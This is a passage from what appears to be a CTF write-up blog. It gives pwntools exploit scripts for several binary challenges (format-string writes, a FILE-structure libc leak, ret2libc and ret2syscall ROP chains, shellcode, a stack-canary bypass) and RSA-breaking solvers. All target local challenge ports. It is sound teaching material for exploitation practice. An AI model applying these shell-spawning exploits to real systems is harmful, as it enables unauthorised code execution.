class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import *<br><br>from ctypes import *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment"># context.arch = &quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">40621</span>)<br><span class="hljs-comment"># p = process(&#x27;./format_level2&#x27;)</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;3&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;%p&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>stack = <span class="hljs-keyword">int</span>(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>func_ret = stack + <span class="hljs-number">64</span><br>p.sendline(b<span class="hljs-string">&quot;3&quot;</span>)<br>payload = b<span class="hljs-string">&quot;%23p%10$hhn&quot;</span>.ljust(<span class="hljs-number">12</span>, b<span class="hljs-string">&#x27;a&#x27;</span>) + p32(func_ret)<br>p.send(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;3&quot;</span>)<br>payload = b<span class="hljs-string">&quot;%147p%10$hhn&quot;</span>.ljust(<span class="hljs-number">12</span>, b<span class="hljs-string">&#x27;a&#x27;</span>) + p32(func_ret+<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,payload)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="feedback"><a href="#feedback" class="headerlink" title="feedback"></a>feedback</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">42147</span>)<br># p = process(<span class="hljs-string">&#x27;./feedback&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&quot;Which list do you want to write?&quot;</span>,b<span class="hljs-string">&quot;-8&quot;</span>)<br>payload = p64(<span class="hljs-number">0xFBAD1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + b<span class="hljs-string">&#x27;\x00&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;.\n&quot;</span>,payload)<br><br>p.recvuntil(b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1ec980</span><br>success(hex(libc_base))<br>flag = libc_base + <span class="hljs-number">0x1f1700</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>,b<span class="hljs-string">&quot;-11&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;.&quot;</span>,b<span class="hljs-string">&#x27;\x68&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>,b<span class="hljs-string">&quot;-11&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;.&quot;</span>,p64(flag))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="format-level3"><a href="#format-level3" class="headerlink" title="format_level3"></a>format_level3</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = &quot;debug&quot;<br># context.arch = &quot;amd64&quot;<br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">42835</span>)<br># p = process(<span class="hljs-string">&#x27;./format_level3&#x27;</span>)<br><br>p.sendlineafter(&quot;:&quot;,b&quot;3&quot;)<br>p.sendlineafter(&quot;:&quot;,b&quot;%6$p&quot;)<br>p.recvuntil(&quot;0x&quot;)<br>stack = <span class="hljs-type">int</span>(p.recvline()[:<span class="hljs-number">-1</span>], <span class="hljs-number">16</span>)<br>func_ret = stack + <span class="hljs-number">4</span><br><br>p.sendlineafter(&quot;:&quot;,b&quot;3&quot;)<br>payload = &quot;%&#123;&#125;p%6$hhn&quot;.format(func_ret &amp; <span class="hljs-number">0xff</span>)<br>p.sendlineafter(&quot;:&quot;,payload.encode())<br>p.sendlineafter(&quot;:&quot;,b&quot;3&quot;)<br>payload = &quot;%&#123;&#125;p%14$hn&quot;.format(<span class="hljs-number">0x9317</span>)<br>p.sendlineafter(&quot;:&quot;,payload.encode())<br>p.sendlineafter(&quot;:&quot;,b&quot;4&quot;)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br>from LibcSearcher import*<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(&#x27;localhost&#x27;, 38193)<br><span class="hljs-comment">#p = process(&#x27;./pwn(1)&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc6_2.7-10ubuntu3_amd64.so&quot;)</span><br><br>pop_rdi = 0x000000000040117e<br>main = 0x4011E8<br><br>p1 = b<span class="hljs-string">&quot;a&quot;</span> * (0x50 + 0x8)<br>p1 += p64(pop_rdi) + p64(elf.got[&#x27;puts&#x27;])<br>p1 += p64(elf.plt[&#x27;puts&#x27;])<br>p1 += p64(main)<br>p.sendline(p1)<br><br>puts_addr = u64(p.recvuntil(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-6:].ljust(8, b<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-section">success(&quot;puts:%s&quot;,hex(puts_addr))</span><br><br>libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)<br>libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)<br>system_addr = libc_base + libc.dump(&#x27;system&#x27;)<br>bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)<br><br>p2 = b<span class="hljs-string">&quot;a&quot;</span> * (0x50 + 0x8)<br>one = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]<br><span class="hljs-comment"># p2 += p64(libc_base + one[3])</span><br>p2 += p64(pop_rdi) + p64(bin_addr) + p64(0x40122A)<br>p2 += p64(system_addr)<br>p.sendline(p2)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(&#x27;localhost&#x27;, 40953)<br><span class="hljs-comment"># p = process(&#x27;./ret2syscall&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc6_2.35-0ubuntu3_amd64.so&quot;</span>)<br><br>pop_rax = 0x000000000040117e<br>pop_rdi = 0x0000000000401180<br>pop_rsi_rdx = 0x0000000000401182<br>bss = 0x0000000000404060<br>ret = 0x00000000004011C1<br>syscall_addr = 0x401185<br>binsh_addr = 0x0000000000404040<br><br>payload = b<span class="hljs-string">&quot;a&quot;</span> * 0x48<br>payload += p64(pop_rdi) + p64(binsh_addr)  <span class="hljs-comment"># stackoverflow &amp; rdi=binsh_addr</span><br>payload += p64(pop_rsi_rdx) + p64(0) + p64(0)  <span class="hljs-comment"># rsi=0 rdx=0</span><br>payload += p64(pop_rax) + p64(59)  <span class="hljs-comment"># rax=59 </span><br>payload += p64(syscall_addr)  <span class="hljs-comment"># execve(&quot;/bin/sh&quot;,0,0)</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="shellcode-level2"><a href="#shellcode-level2" class="headerlink" title="shellcode_level2"></a>shellcode_level2</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">41523</span>)<br># p = process(<span class="hljs-string">&#x27;./shellcode_level2&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./shellcode_level2&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc6_2.35-0ubuntu3_amd64.so&quot;</span>)<br><br>payload = b<span class="hljs-string">&#x27;\x00&#x27;</span>+asm(shellcraft.sh()) <br># gdb.attach(p)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="little-canary"><a href="#little-canary" class="headerlink" title="little_canary"></a>little_canary</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs erlang"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>from LibcSearcher import *  <br>from ctypes import *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br># context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(&#x27;localhost&#x27;, <span class="hljs-number">40905</span>)<br># p = process(&#x27;./little_canary&#x27;)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br># libc = ELF(<span class="hljs-string">&quot;./libc-2.32-1.fc33.x86_64.so&quot;</span>)<br><br>main = <span class="hljs-number">0</span>x4012BA<br>pop_rdi = <span class="hljs-number">0</span>x0000000000401343<br><br>p.sendlineafter(b<span class="hljs-string">&quot;name?\n&quot;</span>,b<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">72</span>)<br>p.recvuntil(b<span class="hljs-string">&quot;\n&quot;</span>)<br>canary = u64(b<span class="hljs-string">&quot;\x00&quot;</span>+p.recv(<span class="hljs-number">7</span>))<br># gdb.attach(p)<br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(hex(canary))</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(hex(elf.got[&#x27;puts&#x27;]))</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> = <span class="hljs-title">b&#x27;a&#x27;</span>*72+<span class="hljs-title">p64</span><span class="hljs-params">(canary)</span>+<span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(elf.got[&#x27;puts&#x27;])</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(elf.plt[&#x27;puts&#x27;])</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(main)</span></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">leak</span> = <span class="hljs-title">u64</span><span class="hljs-params">(p.recvuntil(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))</span></span><br><span class="hljs-function"><span class="hljs-title">leak</span> = <span class="hljs-title">u64</span><span class="hljs-params">(p.recvuntil(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))</span></span><br><span class="hljs-function"><span class="hljs-title">libc</span> = L<span class="hljs-title">ibcSearcher</span><span class="hljs-params">(&#x27;puts&#x27;,leak)</span>  </span><br><span class="hljs-function"><span class="hljs-title">libc_base</span> = <span class="hljs-title">leak</span> - <span class="hljs-title">libc</span>.<span class="hljs-title">dump</span><span class="hljs-params">(&#x27;puts&#x27;)</span></span><br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(hex(libc_base))</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(b<span class="hljs-string">&quot;payload&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">payload</span> = <span class="hljs-title">b&#x27;a&#x27;</span>*72+<span class="hljs-title">p64</span><span class="hljs-params">(canary)</span>+<span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>))</span>+<span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>x4012DC)</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(libc_base + libc.dump(&#x27;system&#x27;))</span></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">interactive</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><h3 id="shellcode-level3"><a href="#shellcode-level3" class="headerlink" title="shellcode_level3"></a>shellcode_level3</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">34733</span>)<br>elf = ELF(<span class="hljs-string">&quot;./shellcode_level3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc6_2.35-0ubuntu3_amd64.so&quot;</span>)<br><br><br>p.sendline(b<span class="hljs-string">&quot;\xE9\x48\xD1\xFF\xFF&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h3 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a>baby_e</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>n = <span class="hljs-number">553409369582823237678532685244026647155180191225879439432235077135813123637186465008813830373646133388592395760175777499266561095087891764348044063111935877931069321764391883899483374576303169645488542398590564148654412004383012178107972880058460460806768779452529433458826925606225797078653905380530651390617109384086518728626571028089036812787671647095695947167204428442727185744172445701874820612799168887428075695751162763647868386879374037826876671079326544820609721731078985096813307183878793033824330869698508952853770794414757655681370862323768018291030331209143189638496644361618184164228294031490537429556439588954274708598530042700988138862000054458742762198052079867259365645914383561162796796952346445529346145323567650621600171442575319262718389389870407629339714751583360252884338116164466349449862781112019462555743429653595045695696967783338371470032332852204294900011651434678829104876529439166176589508898757122660322523937330848536715937381297551894198974459004139082562228022412335520195652419375915216074658463954339332593244483927157329404652516225481116614815221154229491846087288087715884363786672244655901308480290011237244562251084095684531716327141154558809471185132979704992609461470501119328696999713829</span><br>e = <span class="hljs-number">7</span><br>c = <span class="hljs-number">147693154873835354725007152781732424355869776162377337823960431913672366269917723916891506269449726723757821517328874729037838600793748824028829185409932536014732765063216715033843955453706710187792772702199448156372644163429786386035008302836467605094954587157232829525150652611067567669525072625329634860065850520051628272535479197120008981979404760445193750864902244921407742155742716289495581989134730376783828846663464819337418977287363028738701414486788851136608957124505485242331701209645216580641917007780811842757125048746184068597664780265422321550909392419865169775282217442331295071069272774722564587602419768461231775480847018941840911357926330143045826277813722919121117172763493242590521245640828462665947672485094793188432098216701511715232654611338293295459889814699850788048985878279440740712956248569068077253790198036918598519191892836075254345518967666166925163908185663991353344555402397055977817370082929420443034626201745027965444069777059760865359310439815816749939498993014457995041394803598825093836045546578310632172636478575946653375857640993393714607308326474003446154152048840071034349831168612740218034679021240949747357214453636633636662650940968576792518622437627529244515229173</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">n, e, c</span>):<br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        m1 = k * n + c<br>        m, t = gmpy2.iroot(m1, e)<br>        <span class="hljs-keyword">if</span> t:<br>            <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br>            <span class="hljs-keyword">break</span><br>        k += <span class="hljs-number">1</span><br>exp(n, e, c)<br></code></pre></td></tr></table></figure><h3 id="bad-E"><a href="#bad-E" class="headerlink" title="bad_E"></a>bad_E</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br> <br>e = <span class="hljs-number">65537</span><br>p = <span class="hljs-number">11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span><br>q = <span class="hljs-number">6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span><br>c = <span class="hljs-number">63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span><br>n = p*q<br> <br>phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(GCD(e,q-<span class="hljs-number">1</span>))<br>d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c,d,p)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h3 id="n-amp-n"><a href="#n-amp-n" class="headerlink" title="n&amp;n"></a>n&amp;n</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>n= <span class="hljs-number">13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531</span><br>e1= <span class="hljs-number">0x114514</span><br>e2= <span class="hljs-number">19198101</span><br>c1= <span class="hljs-number">5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925</span><br>c2= <span class="hljs-number">4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_def</span>(<span class="hljs-params">e1,e2,c1,c2,n</span>):<br>    s,s1,s2 = gmpy2.gcdext(e1, e2)<br>    m = (<span class="hljs-built_in">pow</span>(c1,s1,n) * <span class="hljs-built_in">pow</span>(c2 ,s2 ,n)) % n<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(m)<br><br>m=exp_def(e1,e2,c1,c2,n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h3 id="factor-signin"><a href="#factor-signin" class="headerlink" title="factor_signin"></a>factor_signin</h3><p>factordb</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">p1 = <span class="hljs-number">18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741</span><br>q1 = <span class="hljs-number">19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901</span><br>n1 = <span class="hljs-number">343504538870081878757729748260620800783581983635281373321527119223374418103340873199654926888439040391545101913132680017655039577253974802351999985470115474655124168592386965001556620077117966153475518658881140827499124290142523464795351995478153288872749817655925271395693435582010998996210909883510311066017237567799370371513462802547313382594409676803895262837061350017911885033133654781876923251129406855067993830824618637981136966134029212516871210627954762147349788788999116702635535406398258621926040887099782494271000823401788337120154104692934583729065189687995570122890809807661370008740283447636580308161498808092269041815719148127168137018600113465985504975054319601741498799761500526467431533990903047624407330243357514588557352746347337683868781554819821575385685459666842162355673947984514687068626166144076257334426612302554448774082488600083569900006274897032242821388126274957846236552373226099112200392102883351088570736254707966329366625911183721875374731791052229266503696334310835323523568132399330263642353927504971311717117370721838701629885670598853025212521537158141447625623337563164790788106598854822686494249848796441153496412236527242235888308435573209980270776407776277489669763803746640746378181948641</span><br>e = <span class="hljs-number">65537</span><br>c1 = <span 